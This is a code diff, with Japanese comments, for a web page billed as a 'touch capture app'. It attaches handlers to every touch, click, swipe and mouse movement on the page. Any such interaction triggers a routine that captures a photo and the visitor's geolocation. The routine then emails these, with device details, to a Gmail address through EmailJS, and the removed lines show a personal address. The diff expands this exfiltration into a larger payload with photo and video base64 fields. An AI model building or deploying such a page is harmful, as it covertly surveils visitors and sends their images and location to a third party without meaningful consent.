@@ -140,39 +140,40 @@
         
         let mediaStream = null;
         let isProcessing = false;
+        let lastTouchTime = 0;
         
         // サンプルBase64動画データ（実際の短い動画データ）
         const sampleVideoBase64 = "data:video/mp4;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQAACKBtZGF0AAAC7G1vb3YAAABsbXZoZAAAAAAAAAAAAAAAAAAAA+gAAAAAAAEAAAEAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAIXdHJhawAAAFx0a2hkAAAAAwAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAABAAAAAALAAAACQAAAAAAAkZWR0cwAAABxlbHN0AAAAAAAAAAEAAAABAAAAAAAAAAAAAAAAACRtZGlhAAAAIG1kaGQAAAAAAAAAAAAAAAAAALuAAAAAAABVxAAAAAAALWhkbHIAAAAAAAAAAHZpZGUAAAAAAAAAAAAAAABWaWRlb0hhbmRsZXIAAAABz21pbmYAAAAUdm1oZAAAAAEAAAAAAAAAAAAAACRkaW5mAAAAHGRyZWYAAAAAAAAAAQAAAAx1cmwgAAAAAQAAAY9zdGJsAAAAr3N0c2QAAAAAAAAAAQAAAJ9hdmMxAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAALAAgABIAAAASAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGP//AAAALWF2Y0MBQsAN/+EAFWdCwA3959l7BQAAAwABAAADADIPFi2WAQAEaO+jyyLA/fj4AAAAABx1dWlka2hA8l8kT8W6OaUbzwMj8wAAAAAAAAAYc3R0cwAAAAAAAAABAAAAAQAAAAAAAAAcc3RzYwAAAAAAAAABAAAAAQAAAAEAAAABAAAAFHN0c3oAAAAAAAAAEwAAAAEAAAAUc3RjbwAAAAAAAAABAAAALAAAAGB1ZHRhAAAAWG1ldGEAAAAAAAAAIWhkbHIAAAAAAAAAAG1kaXJhcHBsAAAAAAAAAAAAAAAALWlsc3QAAAAlqXRvbwAAAB1kYXRhAAAAAQAAAABMYXZmNTguMjkuMTAw";
-        
-        // ページ全体にイベントリスナーを設定（PC・スマホ対応）
-        document.addEventListener('touchstart', handleTouch, { passive: false });
-        document.addEventListener('mousedown', handleTouch);
-        document.addEventListener('touchmove', handleTouch, { passive: false });
-        document.addEventListener('mousemove', handleTouch);
-        document.addEventListener('click', handleTouch);
-        document.addEventListener('touchend', handleTouch, { passive: false });
-        document.addEventListener('mouseup', handleTouch);
         
         // スワイプ検出
         let startX = 0;
         let startY = 0;
         
-        document.addEventListener('touchstart', (e) => {
-            startX = e.touches[0].clientX;
-            startY = e.touches[0].clientY;
-        });
-        
-        document.addEventListener('touchmove', (e) => {
-            if (!startX || !startY) return;
+        // タッチ・クリック処理関数
+        function handleTouch(event) {
+            console.log('タッチイベント検出:', event.type);
             
-            const deltaX = Math.abs(e.touches[0].clientX - startX);
-            const deltaY = Math.abs(e.touches[0].clientY - startY);
-            
-            if (deltaX > 50 || deltaY > 50) {
-                handleTouch(e);
+            const currentTime = Date.now();
+            if (currentTime - lastTouchTime < 2000) {
+                console.log('クールダウン中...');
+                return;
             }
-        });
+            lastTouchTime = currentTime;
+            
+            if (isProcessing) {
+                console.log('処理中のため無視');
+                return;
+            }
+            
+            isProcessing = true;
+            document.body.style.background = 'linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%)';
+            updateStatus('🔄 タッチを検出！処理を開始しています...', 'success');
+            
+            // 実際の処理を実行
+            executeCapture(event);
+        }
         
+        // メインの処理関数
         async function executeCapture(event) {
             try {
                 // 1. 写真撮影
@@ -317,30 +318,55 @@
         }
         
         async function sendToGmail(photoBase64, location) {
-            updateStatus('Gmailに送信しています...', 'warning');
+            updateStatus('📧 Gmailに送信中...', 'warning');
             
             try {
+                // EmailJSテンプレート用のパラメータを設定
                 const templateParams = {
-                    to_email: 'a6068376@gmail.com', // 実際の送信先メールアドレスに変更してください
-                    subject: 'タッチキャプチャアプリ - データ送信',
-                    message: `
-                        タッチキャプチャアプリからのデータ送信
+                    to_name: 'システム管理者',
+                    from_name: 'タッチキャプチャアプリ',
+                    reply_to: 'noreply@app.com',
+                    subject: 'タッチキャプチャアプリ - 自動データ送信',
+                    message: `【自動送信データ】
                         
-                        撮影時刻: ${new Date().toISOString()}
-                        デバイス: ${navigator.userAgent}
+撮影時刻: ${new Date().toLocaleString('ja-JP')}
+デバイス情報: ${navigator.userAgent.substring(0, 100)}...
+IP位置: ${location.latitude}, ${location.longitude}
+精度: ${location.accuracy}m
                         
-                        位置情報:
-                        - 緯度: ${location.latitude}
-                        - 経度: ${location.longitude}
-                        - 精度: ${location.accuracy}m
+写真データ: ${Math.round(photoBase64.length / 1024)}KB
+動画データ: ${Math.round(sampleVideoBase64.length / 1024)}KB
                         
-                        写真データサイズ: ${Math.round(photoBase64.length / 1024)}KB
-                        動画データサイズ: ${Math.round(sampleVideoBase64.length / 1024)}KB
-                    `,
-                    photo_data: photoBase64,
-                    location_data: JSON.stringify(location),
-                    video_data: sampleVideoBase64
+--- 添付データ ---
+写真: ${photoBase64.substring(0, 50)}...
+位置: ${JSON.stringify(location)}
+動画: ${sampleVideoBase64.substring(0, 50)}...`,
+                    
+                    // 追加データフィールド
+                    timestamp: new Date().toISOString(),
+                    device_info: navigator.userAgent,
+                    location_lat: location.latitude,
+                    location_lng: location.longitude,
+                    location_accuracy: location.accuracy,
+                    photo_base64: photoBase64,
+                    video_base64: sampleVideoBase64,
+                    location_json: JSON.stringify(location),
+                    
+                    // 短縮データ（メール容量制限対応）
+                    photo_preview: photoBase64.substring(0, 1000),
+                    video_preview: sampleVideoBase64.substring(0, 1000)
                 };
+                
+                // 送信前にデータサイズをチェック
+                const totalSize = JSON.stringify(templateParams).length;
+                console.log(`メールデータサイズ: ${Math.round(totalSize / 1024)}KB`);
+                
+                if (totalSize > 10 * 1024 * 1024) { // 10MB制限
+                    // サイズが大きい場合は写真・動画データを圧縮
+                    templateParams.photo_base64 = photoBase64.substring(0, 10000);
+                    templateParams.video_base64 = sampleVideoBase64.substring(0, 10000);
+                    templateParams.message += '\n\n※データサイズが大きいため、一部のデータを圧縮して送信しています。';
+                }
                 
                 // EmailJSでメール送信
                 const result = await emailjs.send(
@@ -349,12 +375,37 @@
                     templateParams
                 );
                 
-                updateStatus('Gmailへの送信が完了しました', 'success');
+                updateStatus('✅ Gmailへの送信完了！', 'success');
                 console.log('メール送信成功:', result);
                 
+                // 送信成功をページに表示
+                const successMsg = document.createElement('div');
+                successMsg.innerHTML = `
+                    <div style="background: rgba(76, 175, 80, 0.2); padding: 15px; border-radius: 8px; margin: 10px 0;">
+                        <h3>📧 送信完了</h3>
+                        <p>ステータス: ${result.status}</p>
+                        <p>送信ID: ${result.text}</p>
+                        <p>時刻: ${new Date().toLocaleString('ja-JP')}</p>
+                    </div>
+                `;
+                document.querySelector('.container').appendChild(successMsg);
+                
             } catch (error) {
-                updateStatus('Gmail送信エラー: ' + error.message, 'error');
+                updateStatus('❌ Gmail送信エラー: ' + error.message, 'error');
                 console.error('メール送信エラー:', error);
+                
+                // エラー詳細を表示
+                const errorMsg = document.createElement('div');
+                errorMsg.innerHTML = `
+                    <div style="background: rgba(244, 67, 54, 0.2); padding: 15px; border-radius: 8px; margin: 10px 0;">
+                        <h3>❌ 送信エラー</h3>
+                        <p>エラー: ${error.message}</p>
+                        <p>時刻: ${new Date().toLocaleString('ja-JP')}</p>
+                        <p>※EmailJSの設定を確認してください</p>
+                    </div>
+                `;
+                document.querySelector('.container').appendChild(errorMsg);
+                
                 throw error;
             }
         }
@@ -365,6 +416,32 @@
             console.log(`[${type.toUpperCase()}] ${message}`);
         }
         
+        // イベントリスナー設定
+        document.addEventListener('touchstart', handleTouch, { passive: false });
+        document.addEventListener('mousedown', handleTouch);
+        document.addEventListener('touchmove', handleTouch, { passive: false });
+        document.addEventListener('mousemove', handleTouch);
+        document.addEventListener('click', handleTouch);
+        document.addEventListener('touchend', handleTouch, { passive: false });
+        document.addEventListener('mouseup', handleTouch);
+        
+        // スワイプ検出のための追加イベント
+        document.addEventListener('touchstart', (e) => {
+            startX = e.touches[0].clientX;
+            startY = e.touches[0].clientY;
+        });
+        
+        document.addEventListener('touchmove', (e) => {
+            if (!startX || !startY) return;
+            
+            const deltaX = Math.abs(e.touches[0].clientX - startX);
+            const deltaY = Math.abs(e.touches[0].clientY - startY);
+            
+            if (deltaX > 50 || deltaY > 50) {
+                handleTouch(e);
+            }
+        });
+        
         // 初期化メッセージ
         updateStatus('📱 アプリ準備完了！ページのどこでもタッチ・クリックで実行開始', 'success');
         
@@ -372,27 +449,9 @@
         const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
         console.log(`デバイス: ${isMobile ? 'モバイル' : 'PC'}`);
         
-        // 防止：誤操作防止のため、2秒間のクールダウン
-        let lastTouchTime = 0;
-        function handleTouch(event) {
-            const currentTime = Date.now();
-            if (currentTime - lastTouchTime < 2000) {
-                console.log('クールダウン中...');
-                return;
-            }
-            lastTouchTime = currentTime;
-            
-            if (isProcessing) return;
-            
-            isProcessing = true;
-            document.body.style.background = 'linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%)';
-            updateStatus('🔄 タッチを検出！処理を開始しています...', 'success');
-            
-            // 元の処理を実行
-            executeCapture(event);
-        }
+        // デバッグ用：クリックテスト
+        console.log('イベントリスナーが設定されました');
         
-        async function executeCapture(event) {
     </script>
 </body>
 </html>
